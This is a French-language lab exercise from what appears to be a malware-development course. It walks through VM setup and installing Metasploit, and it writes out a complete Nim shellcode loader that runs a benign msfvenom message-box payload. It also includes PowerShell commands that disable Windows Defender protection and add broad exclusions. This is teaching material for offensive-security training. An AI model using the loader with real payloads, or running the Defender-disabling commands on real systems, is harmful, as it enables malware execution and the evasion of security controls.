# Exercice 1 - Configuration et Déploiement du Lab Maldev

## 🎯 Objectif

Mettre en place un environnement de développement de malware complet avec des machines virtuelles Windows, configurer l'accès à distance, et créer votre premier shellcode loader.

---

## 📋 Prérequis

- Lupus (outil de déploiement de VMs)
- Accès à un hyperviseur (VirtualBox, VMware, Hyper-V)
- Connexion Internet pour les téléchargements

---

## 🚀 Étapes de Configuration

### 1. Configurer les VMs avec un fichier YAML

Créez un fichier `maldev-lab.yaml` pour définir votre infrastructure :

```yaml
vms:
  - name: maldev-windows
    os: windows10
    ram: 4096
    cpu: 2
    disk: 60GB
    network: NAT
    
  - name: maldev-dev
    os: windows11
    ram: 8192
    cpu: 4
    disk: 80GB
    network: NAT
```

### 2. Déployer avec Lupus

```bash
# Déployer l'infrastructure
lupus deploy maldev-lab.yaml

# Vérifier le statut des VMs
lupus status

# Se connecter à une VM
lupus connect maldev-dev
```

### 3. Installer Windows Remote App

Sur votre machine hôte (ou machine de contrôle) :

**Option A : Via PowerShell**
```powershell
# Installer Remote Desktop Connection Manager
winget install Microsoft.RemoteDesktop
```

**Option B : Téléchargement manuel**
- Téléchargez Remote Desktop depuis le Microsoft Store
- Ou utilisez `mstsc.exe` (intégré à Windows)

### 4. Configurer les machines sur Windows Remote

Sur chaque VM Windows, activez Remote Desktop :

```powershell
# PowerShell en Administrateur
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Autoriser Remote Desktop dans le pare-feu
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Obtenir l'adresse IP de la VM
ipconfig | findstr IPv4
```

**Ajouter les connexions dans Remote Desktop :**
1. Ouvrez Remote Desktop Connection Manager
2. Ajoutez chaque VM avec son IP
3. Sauvegardez les identifiants

### 5. Installer le nécessaire sur la machine de dev

Connectez-vous à la VM `maldev-dev` et exécutez les commandes suivantes :

#### a) Installer les outils de développement C#

```cmd
choco install -y visualstudio2019community dotnetfx
```

**Composants inclus :**
- Visual Studio 2019 Community Edition
- .NET Framework (toutes versions)

#### b) Installer Nim et ChoooseNim

```cmd
choco install -y nim choosenim
```

**Vérification :**
```cmd
nim --version
choosenim --version
```

#### c) Installer WSL2

```cmd
choco install -y wsl2
```

**Activer WSL :**
```cmd
wsl --install
```

#### d) Installer Ubuntu sur WSL

```cmd
wsl --install Ubuntu
```

**Configuration initiale :**
- Créez un nom d'utilisateur
- Définissez un mot de passe
- Attendez la fin de l'installation

#### e) Installer les outils Linux dans WSL

```bash
# Lancer WSL
wsl

# Mettre à jour le système
sudo apt update && sudo apt upgrade -y

# Installer les outils essentiels
sudo apt install -y build-essential mingw-w64 git curl wget

# Installer Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

---

## 🎯 Premier Shellcode Loader

### Étape 1 : Générer le shellcode avec msfvenom

Depuis WSL :

```bash
msfvenom -p windows/x64/messagebox TEXT='Task failed successfully!' TITLE='Error!' -f nim
```

**Sortie attendue :**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 318 bytes
Final size of nim file: 1652 bytes
```

**Shellcode généré :**
```nim
var buf: array[318, byte] = [
  byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,
  0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,
  # ... (shellcode complet)
]
```

### Étape 2 : Créer le loader Nim

Créez un fichier `loader.nim` :

```nim
import winim/lean

proc main() =
  # Shellcode généré par msfvenom
  let buf: array[318, byte] = [
    byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,
    0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,
    0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
    0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,
    0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
    0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,
    0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,
    0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,
    0x48,0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0xe3,0x56,
    0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
    0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,0xc1,
    0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
    0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,
    0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,
    0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x48,0x01,0xd0,0x59,0x5a,
    0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,
    0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,
    0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75,0x73,0x65,0x72,
    0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c,0x77,
    0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0xe8,
    0x1a,0x00,0x00,0x00,0x54,0x61,0x73,0x6b,0x20,0x66,0x61,0x69,
    0x6c,0x65,0x64,0x20,0x73,0x75,0x63,0x63,0x65,0x73,0x73,0x66,
    0x75,0x6c,0x6c,0x79,0x21,0x00,0x5a,0xe8,0x07,0x00,0x00,0x00,
    0x45,0x72,0x72,0x6f,0x72,0x21,0x00,0x41,0x58,0x48,0x31,0xc9,
    0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,
    0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5
  ]
  
  # Allouer mémoire exécutable
  let mem = VirtualAlloc(nil, buf.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  
  # Copier le shellcode en mémoire
  copyMem(mem, unsafeAddr buf[0], buf.len)
  
  # Rendre la mémoire exécutable
  var oldProtect: DWORD
  discard VirtualProtect(mem, buf.len, PAGE_EXECUTE_READ, addr oldProtect)
  
  # Créer un thread pour exécuter le shellcode
  var threadId: DWORD
  let hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, addr threadId)
  
  # Attendre que le thread se termine
  discard WaitForSingleObject(hThread, INFINITE)

main()
```

### Étape 3 : Compiler le loader

```bash
nim c -d:mingw -d:release -d:strip --opt:size --cpu:amd64 --os:windows \
  --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  loader.nim
```

**Options de compilation :**
- `-d:mingw` : Utiliser MinGW pour la cross-compilation
- `-d:release` : Mode release (optimisé)
- `-d:strip` : Supprimer les symboles de débogage
- `--opt:size` : Optimiser pour la taille du binaire
- `--cpu:amd64` : Architecture 64-bit
- `--os:windows` : Cible Windows

### Étape 4 : Transférer et tester

```bash
# Créer le dossier de test sur Windows
mkdir -p /mnt/c/maldev-lab

# Copier le loader
cp loader.exe /mnt/c/maldev-lab/

# Vérifier
ls -lh /mnt/c/maldev-lab/loader.exe
```

### Étape 5 : Désactiver Windows Defender (sur la VM de test)

```powershell
# PowerShell en Administrateur
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableTamperProtection $true

# Ajouter une exclusion
New-Item -Path "C:\maldev-lab" -ItemType Directory -Force
Add-MpPreference -ExclusionPath "C:\maldev-lab"
Add-MpPreference -ExclusionExtension ".exe"

# Vérifier que Defender est désactivé
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled
```

### Étape 6 : Exécuter le loader

1. Sur Windows, ouvrez `C:\maldev-lab\`
2. Double-cliquez sur `loader.exe`
3. Une MessageBox devrait apparaître avec :
   - **Titre** : "Error!"
   - **Message** : "Task failed successfully!"

---

## ✅ Validation de l'exercice

Vous avez réussi si :

- [ ] Les VMs sont déployées et accessibles via Remote Desktop
- [ ] WSL2 et Ubuntu sont installés et fonctionnels
- [ ] Nim et les outils de compilation sont opérationnels
- [ ] Le shellcode a été généré avec msfvenom
- [ ] Le loader compile sans erreur
- [ ] Le loader s'exécute et affiche la MessageBox
- [ ] Windows Defender est correctement configuré pour ne pas bloquer vos tests

---

## 🔧 Dépannage

### Erreur de compilation Nim
```bash
# Installer winim si manquant
nimble install winim
```

### Erreur "virus detected"
```powershell
# Restaurer depuis la quarantaine
Get-MpThreat | Remove-MpThreat
```

### WSL ne démarre pas
```cmd
# Réinitialiser WSL
wsl --shutdown
wsl --unregister Ubuntu
wsl --install Ubuntu
```

---

## 📚 Ressources supplémentaires

- [Documentation Nim](https://nim-lang.org/docs/)
- [Winim GitHub](https://github.com/khchen/winim)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Windows API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)

---

## 🎓 Prochaines étapes

Une fois cet exercice complété, vous êtes prêt pour :
- Exercice 2 : Techniques d'évasion AV de base
- Exercice 3 : Injection de processus
- Exercice 4 : Obfuscation et encryption du shellcode

---

**Bon développement ! 🚀**
